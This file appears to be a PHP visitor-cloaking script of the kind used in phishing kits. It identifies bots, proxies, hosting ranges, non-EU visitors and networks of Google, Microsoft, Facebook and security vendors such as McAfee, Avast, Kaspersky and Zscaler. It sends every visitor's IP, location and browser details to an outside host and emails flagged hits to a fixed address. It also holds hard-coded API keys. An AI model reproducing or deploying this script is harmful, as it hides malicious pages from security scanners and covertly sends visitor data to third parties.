<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

function getBrowser(){
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $checkBrowser = 0;
 
    //First get the platform?
    if (preg_match('/linux/i', $u_agent)){
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)){
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)){
        $platform = 'windows';
    }
    
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/googlebot/i',$u_agent)){
        $bname = 'Bot : Google Bot';
		$checkBrowser = 0;
    }
    elseif(preg_match('/google/i',$u_agent)){
        $bname = 'Bot : Google';
		$checkBrowser = 0;
    }
    elseif(preg_match('/adsbot/i',$u_agent)){
        $bname = 'Bot : AdsBot';
		$checkBrowser = 0;
    }
    elseif(preg_match('/ads/i',$u_agent)){
        $bname = 'Bot : Ads';
		$checkBrowser = 0;
    }
    elseif(preg_match('/bot/i',$u_agent)){
        $bname = 'Bot : Bot';
		$checkBrowser = 0;
    }
    elseif(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
        $bname = 'Internet Explorer';
		$checkBrowser = 1;
    }
    elseif(preg_match('/Firefox/i',$u_agent)){
        $bname = 'Mozilla Firefox';
		$checkBrowser = 1;
    }
    elseif(preg_match('/Chrome/i',$u_agent)){
        $bname = 'Google Chrome';
		$checkBrowser = 1;
    }
    elseif(preg_match('/Safari/i',$u_agent)){
        $bname = 'Apple Safari';
		$checkBrowser = 1;
    }
    elseif(preg_match('/Opera/i',$u_agent)){
        $bname = 'Opera';
		$checkBrowser = 1;
    }
    elseif(preg_match('/Netscape/i',$u_agent)){
        $bname = 'Netscape';
		$checkBrowser = 1;
    }
    
    return array(
        'browser_agent' => $u_agent,
        'browser_name' => $bname,
        'browser_platform' => $platform,
        'browser_check' => $checkBrowser
    );
}

function CheckIpAdresse($result){
	$check_data_func = 'OK';
	if($result -> continentCode == 'EU'){
		if(preg_match('/as15169/i', $result -> {"as"})){$check_data_func = 'AS : AS15169 GOOGLE';}
		elseif(preg_match('/google/i', $result -> {"as"})){$check_data_func = 'AS : GOOGLE';}
		elseif(preg_match('/google/i', $result -> asname)){$check_data_func = 'ASNAME : GOOGLE';}
		elseif(preg_match('/google/i', $result -> isp)){$check_data_func = 'ISP : GOOGLE';}
		elseif(preg_match('/google/i', $result -> org)){$check_data_func = 'ORG : GOOGLE';}

		elseif(preg_match('/amazon/i', $result -> {"as"})){$check_data_func = 'AS : AMAZON';}
		elseif(preg_match('/amazon/i', $result -> asname)){$check_data_func = 'ASNAME : AMAZON';}
		elseif(preg_match('/amazon/i', $result -> isp)){$check_data_func = 'ISP : AMAZON';}
		elseif(preg_match('/amazon/i', $result -> org)){$check_data_func = 'ASNAME : AMAZON';}

		elseif(preg_match('/facebook/i', $result -> {"as"})){$check_data_func = 'AS : FACEBOOK';}
		elseif(preg_match('/facebook/i', $result -> asname)){$check_data_func = 'ASNAME : FACEBOOK';}
		elseif(preg_match('/facebook/i', $result -> isp)){$check_data_func = 'ISP : FACEBOOK';}
		elseif(preg_match('/facebook/i', $result -> org)){$check_data_func = 'ASNAME : FACEBOOK';}

		elseif(preg_match('/mcafee/i', $result -> {"as"})){$check_data_func = 'AS : MCAFEE';}
		elseif(preg_match('/mcafee/i', $result -> asname)){$check_data_func = 'ASNAME : MCAFEE';}
		elseif(preg_match('/mcafee/i', $result -> isp)){$check_data_func = 'ISP : MCAFEE';}
		elseif(preg_match('/mcafee/i', $result -> org)){$check_data_func = 'ASNAME : MCAFEE';}

		elseif(preg_match('/isecg/i', $result -> org)){$check_data_func = 'ASNAME : Intel Deutschland GmbH';}
		elseif(preg_match('/intel/i', $result -> org)){$check_data_func = 'ASNAME : Intel';}

		elseif(preg_match('/microsoft/i', $result -> {"as"})){$check_data_func = 'AS : MICROSOFT';}
		elseif(preg_match('/microsoft/i', $result -> asname)){$check_data_func = 'ASNAME : MICROSOFT';}
		elseif(preg_match('/microsoft/i', $result -> isp)){$check_data_func = 'ISP : MICROSOFT';}
		elseif(preg_match('/microsoft/i', $result -> org)){$check_data_func = 'ASNAME : MICROSOFT';}

		elseif(preg_match('/bing/i', $result -> {"as"})){$check_data_func = 'AS : BING';}
		elseif(preg_match('/bing/i', $result -> asname)){$check_data_func = 'ASNAME : BING';}
		elseif(preg_match('/bing/i', $result -> isp)){$check_data_func = 'ISP : BING';}
		elseif(preg_match('/bing/i', $result -> org)){$check_data_func = 'ASNAME : BING';}

		elseif(preg_match('/avast/i', $result -> {"as"})){$check_data_func = 'AS : AVAST';}
		elseif(preg_match('/avast/i', $result -> asname)){$check_data_func = 'ASNAME : AVAST';}
		elseif(preg_match('/avast/i', $result -> isp)){$check_data_func = 'ISP : AVAST';}
		elseif(preg_match('/avast/i', $result -> org)){$check_data_func = 'ASNAME : AVAST';}

		elseif(preg_match('/plutex/i', $result -> {"as"})){$check_data_func = 'AS : PLUTEX';}
		elseif(preg_match('/plutex/i', $result -> asname)){$check_data_func = 'ASNAME : PLUTEX';}
		elseif(preg_match('/plutex/i', $result -> isp)){$check_data_func = 'ISP : PLUTEX';}
		elseif(preg_match('/plutex/i', $result -> org)){$check_data_func = 'ASNAME : PLUTEX';}

		elseif(preg_match('/hostroyale/i', $result -> {"as"})){$check_data_func = 'AS : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> asname)){$check_data_func = 'ASNAME : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> isp)){$check_data_func = 'ISP : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> org)){$check_data_func = 'ASNAME : HostRoyale';}

		elseif(preg_match('/kaspersky/i', $result -> {"as"})){$check_data_func = 'AS : Kaspersky Lab Switzerland';}
		elseif(preg_match('/kl-ext/i', $result -> asname)){$check_data_func = 'ASNAME : Kaspersky Lab Switzerland';}
		elseif(preg_match('/kaspersky/i', $result -> isp)){$check_data_func = 'ISP : Kaspersky Lab Switzerland';}
		elseif(preg_match('/kaspersky/i', $result -> org)){$check_data_func = 'ASNAME : Kaspersky Lab Switzerland';}

		elseif(preg_match('/ukcloud/i', $result -> {"as"})){$check_data_func = 'AS : UKCLOUD LTD';}
		elseif(preg_match('/ukcloud/i', $result -> asname)){$check_data_func = 'ASNAME : UKCLOUD LTD';}
		elseif(preg_match('/ukcloud/i', $result -> isp)){$check_data_func = 'ISP : UKCLOUD LTD';}
		elseif(preg_match('/ukcloud/i', $result -> org)){$check_data_func = 'ASNAME : UKCLOUD LTD';}

		elseif(preg_match('/zscaler/i', $result -> {"as"})){$check_data_func = 'AS : Zscaler, Inc.';}
		elseif(preg_match('/zscaler/i', $result -> asname)){$check_data_func = 'ASNAME : Zscaler, Inc.';}
		elseif(preg_match('/zscaler/i', $result -> isp)){$check_data_func = 'ISP : Zscaler, Inc.';}
		elseif(preg_match('/zscaler/i', $result -> org)){$check_data_func = 'ASNAME : Zscaler, Inc.';}

		elseif(preg_match('/arthur j. gallagher/i', $result -> {"as"})){$check_data_func = 'AS : Arthur J. Gallagher & Co.';}
		elseif(preg_match('/ajgco/i', $result -> asname)){$check_data_func = 'ASNAME : AJGCO (Arthur J. Gallagher & Co.)';}
		elseif(preg_match('/arthur j. gallagher/i', $result -> isp)){$check_data_func = 'ISP : Arthur J. Gallagher & Co.';}
		elseif(preg_match('/gallagher bassett/i', $result -> org)){$check_data_func = 'ASNAME : Gallagher Bassett Services, Inc.';}

		elseif(preg_match('/as5631/i', $result -> {"as"})){$check_data_func = 'AS : AS5631 Luminet Data Limited';}
		elseif(preg_match('/luminet/i', $result -> asname)){$check_data_func = 'ASNAME : LUMINET';}
		elseif(preg_match('/urbanwimax/i', $result -> isp)){$check_data_func = 'ISP : URBANWIMAX';}
		//elseif(preg_match('//i', $result -> org)){$check_data_func = 'ASNAME : Gallagher Bassett Services, Inc.';}

		elseif(preg_match('/hostroyale/i', $result -> {"as"})){$check_data_func = 'AS : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> asname)){$check_data_func = 'ASNAME : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> isp)){$check_data_func = 'ISP : HostRoyale';}
		elseif(preg_match('/hostroyale/i', $result -> org)){$check_data_func = 'ASNAME : HostRoyale';}

		elseif(preg_match('/as203885 sncf/i', $result -> {"as"})){$check_data_func = 'AS : AS203885 SNCF';}
		elseif(preg_match('/sncf/i', $result -> asname)){$check_data_func = 'ASNAME : SNCF-ASN';}
		elseif(preg_match('/sncf/i', $result -> isp)){$check_data_func = 'ISP : SNCF';}

		elseif(preg_match('/as41704 jsc/i', $result -> {"as"})){$check_data_func = 'AS : AS41704 JSC Ufanet';}
		elseif(preg_match('/ogs-as/i', $result -> asname)){$check_data_func = 'ASNAME : OGS-AS - JSC Ufanet';}
		elseif(preg_match('/jsc/i', $result -> isp)){$check_data_func = 'ISP : JSC "Ufanet"';}
		elseif(preg_match('/jsc/i', $result -> org)){$check_data_func = 'ASNAME : JSC Ufanet';}
		
		//8710 - 8625 - _8350 - 8275 - _8250 - _8242 - 8240 - _8234 - 8027 - 7994 - 7986 - 7888 - 7881 - 7877 - 7729 - 7498

		elseif($result -> proxy == 1){$check_data_func = 'PROXY';}
		elseif($result -> hosting == 1){$check_data_func = 'HOSTING';}
	}
	else{
		$check_data_func = 'NON EU';
	}
	return $check_data_func;
}

function CheckHostName($address_IP){
	$data_host_name = '';
	$data_host_link = '';
	//https://api.ipgeolocation.io/ipgeo?apiKey=2f65f2eb51cf475b8e989a50b1f0feb5&include=liveHostname&ip=109.88.203.75
	$ch2 = curl_init();
	curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch2, CURLOPT_URL, 'https://api.ipgeolocation.io/ipgeo?apiKey=2f65f2eb51cf475b8e989a50b1f0feb5&include=liveHostname&ip='.$address_IP);
	$result2 = curl_exec($ch2);
	curl_close($ch2);
	$result2 = json_decode($result2);

	if(preg_match('/google/i', $result2 -> hostname)){
		$data_host_name = 'HOST GOOGLE';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/microsoft/i', $result2 -> hostname)){
		$data_host_name = 'HOST MICROSOFT';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/facebook/i', $result2 -> hostname)){
		$data_host_name = 'HOST FACEBOOK';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/mcafee/i', $result2 -> hostname)){
		$data_host_name = 'HOST MCAFEE';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/avast/i', $result2 -> hostname)){
		$data_host_name = 'HOST AVAST';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/webmail.cpaccess.co.uk/i', $result2 -> hostname)){
		$data_host_name = 'HOST webmail.cpaccess.co.uk';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/mx.machinemart.co.uk/i', $result2 -> hostname)){
		$data_host_name = 'HOST mx.machinemart.co.uk';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/mail.corporatefx.co.uk/i', $result2 -> hostname)){
		$data_host_name = 'HOST mail.corporatefx.co.uk';
		$data_host_link = urlencode($result2 -> hostname);
	}
	elseif(preg_match('/mail.sugarwhite.co.uk/i', $result2 -> hostname)){
		$data_host_name = 'HOST mail.sugarwhite.co.uk';
		$data_host_link = urlencode($result2 -> hostname);
	}
	
	return array(
        'name' => $data_host_name,
        'link' => $data_host_link
    );
}

$check_data_Global_1 = 'OK';
$check_data_Global_2 = 'OK';
$check_data_Global_3 = 'OK';

$domain_name = $_SERVER['SERVER_NAME'];
$domain_type = 'URL - CENTRAL';

$text_Mail_1 = '';
$text_Mail_2 = '';
$text_Mail_3 = '';

$address_IP = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) and $_SERVER['HTTP_X_FORWARDED_FOR'] != '')? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$address_type = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) and $_SERVER['HTTP_X_FORWARDED_FOR']!= '')? 'HTTP_X_FORWARDED_FOR' : 'REMOTE_ADDR';

if($address_IP != '196.206.227.50'){
	//check  IP Info
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_URL, 'https://pro.ip-api.com/json/'.$address_IP.'?fields=status,continent,continentCode,country,countryCode,countryCode3,city,district,isp,org,as,asname,proxy,hosting,query&key=ALPy2ZVuACsi06g');
	$result = curl_exec($ch);
	curl_close($ch);
	$result_IpInfo = json_decode($result);
	
	$data_IpInfo = CheckIpAdresse($result_IpInfo);
	
	//Check IP Host
	$data_IpHost = CheckHostName($address_IP);
	$dataHost_name = $data_IpHost['name'];
	$dataHost_link = $data_IpHost['link'];
	
	//Check User Agent
	$data_Browser = getBrowser();
	$data_Browser_check = $data_Browser['browser_check'];
	
	$data = '';
	foreach($result_IpInfo as $key => $value){
		$data .= '&'.$key.'='.urlencode($value);
	}
	foreach($data_Browser as $key => $value){
		$data .= '&'.$key.'='.urlencode($value);
	}
	
	$check_data_Global_1 = ($data_IpInfo != 'OK')? $data_IpInfo : 'OK';
	if($data_Browser_check == 0){
		$check_data_Global_1 .= ($check_data_Global_1 == '')? 'Browser '.$data_Browser['browser_name'] : ' - Browser '.$data_Browser['browser_name'];
	}
	
	if($dataHost_name != ''){
		$check_data_Global_1 .= ($check_data_Global_1 == '')? 'HOST '.$dataHost_name : ' - HOST '.$dataHost_name ;
	}
	
	$data = 'check_data='.urlencode($check_data_Global_1).'&url='.urlencode($domain_name).'&url_type='.urlencode($domain_type).'&address_type='.urlencode($address_type).'&info_check='.urlencode($data_IpInfo).'&host_name='.urlencode($dataHost_name).'&host_link='.urlencode($dataHost_link).$data;
	$json = file_get_contents("https://tours-vitrine2.usa-etours.com?".$data);
	
	if($check_data_Global_1 != 'OK'){
		$text_Mail_1 = '<table style="width: 100%; padding: 10px; font-size: 13px; font-family: monospace, \'serif\';">
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>status</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> status.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>as</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> {"as"}.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>asname</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> asname.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>isp</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> isp.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>org</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> org.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Proxy - Hosting</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">P: '.intval($result_IpInfo -> proxy).' || H: '.intval($result_IpInfo -> hosting).'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Browser Check</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$data_Browser['browser_check'].'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Browser Name</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$data_Browser['browser_name'].' ('.$data_Browser['browser_platform'].')</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Browser Agent</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$data_Browser['browser_agent'].'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Host Name</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$dataHost_name.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Host Link</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$dataHost_link.'</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Continent</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> continent.' ('.$result_IpInfo -> continentCode.')</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>city</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> city.' ('.$result_IpInfo -> district.')</td>
							</tr>
							<tr>
								<td style="padding: 0; border-bottom: 1px solid #ccc; width: 130px;"><strong>Country</strong></td>
								<td style="padding: 0; border-bottom: 1px solid #ccc;">'.$result_IpInfo -> country.' ('.$result_IpInfo -> countryCode.' - '.$result_IpInfo -> countryCode3.')</td>
							</tr>
						</table>';
	}
}

if($check_data_Global_1 == 'OK' and $check_data_Global_2 == 'OK' and $check_data_Global_3 == 'OK'){
//	continue;
}
else{
	$mail_body = '<!doctype html>
				<html>
				<head>
				<meta charset="utf-8">
				<title>API IP</title>
				</head>

				<body style="font-family: monospace, \'serif\'">
					<h1 style="margin: 0; text-align: center">'.$domain_name.'</h1>
					<h2 style="color: #005aff; margin: 0; text-align: center">'.$domain_type.'</h2>
					<h3 style="color: #ff0000; margin: 0; text-align: center">Erreur: '.$check_data_Global_1.'</h3>
					<br><br>
					<h2 style="background: #ededed; margin: 0; font-size: 15px; padding: 0 0 0 10px;">IP 1: '.$address_type.'</h2>
					<h2 style="margin: 0; font-size: 14px; padding: 0 0 0 10px;">'.$_SERVER['REMOTE_ADDR'].'</h2>
					'.$text_Mail_1.'
				</body>
				</html>';
	
	$header = "From: ".$_SERVER["HTTP_HOST"]."\r\n";
	$header .= "Content-Type: text/html; charset=\"UTF-8\"";

	mail("api-ip@kendo-center.com", "API IP Detect", $mail_body, $header);
}
?>